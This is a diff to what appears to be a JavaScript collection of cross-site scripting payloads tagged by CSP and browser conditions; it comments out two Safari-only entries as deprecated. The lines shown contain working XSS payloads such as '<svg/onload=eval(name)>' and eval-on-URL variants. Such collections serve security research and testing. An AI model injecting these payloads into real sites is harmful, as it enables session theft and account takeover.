@@ -53,11 +53,12 @@ const PAYLOADS = [
         tags: [TAGS.unsafeEval, TAGS.unsafeInline, TAGS.controlsURL],
         author: '@wcbowling'
     },
-    {
-        html: "<iframe/onload=write(URL)>",
-        tags: [TAGS.safariOnly, TAGS.unsafeInline, TAGS.controlsURL],
-        author: '@kinugawamasato'
-    },
+/* deprecated */
+//     {
+//         html: "<iframe/onload=write(URL)>",
+//         tags: [TAGS.safariOnly, TAGS.unsafeInline, TAGS.controlsURL],
+//         author: '@kinugawamasato'
+//     },
     {
         html: "<svg/onload=eval(name)>",
         tags: [TAGS.unsafeInline, TAGS.unsafeEval, TAGS.controlsName, TAGS.notInner, TAGS.firefoxInner],
@@ -78,11 +79,12 @@ const PAYLOADS = [
         tags: [TAGS.inlineStyleAllow, TAGS.controlsName, TAGS.unsafeEval, TAGS.unsafeInline],
         author: null
     },
-    {
-        html: "<style/onload=write(URL)>",
-        tags: [TAGS.safariOnly, TAGS.unsafeInline, TAGS.controlsURL, TAGS.inlineStyleAllow],
-        author: '@kinugawamasato'
-    },
+/* deprecated */
+//     {
+//         html: "<style/onload=write(URL)>",
+//         tags: [TAGS.safariOnly, TAGS.unsafeInline, TAGS.controlsURL, TAGS.inlineStyleAllow],
+//         author: '@kinugawamasato'
+//     },
     {
         html: "<style/onload=eval(`'`+URL)>",
         tags: [TAGS.unsafeEval, TAGS.unsafeInline, TAGS.controlsURL, TAGS.inlineStyleAllow],
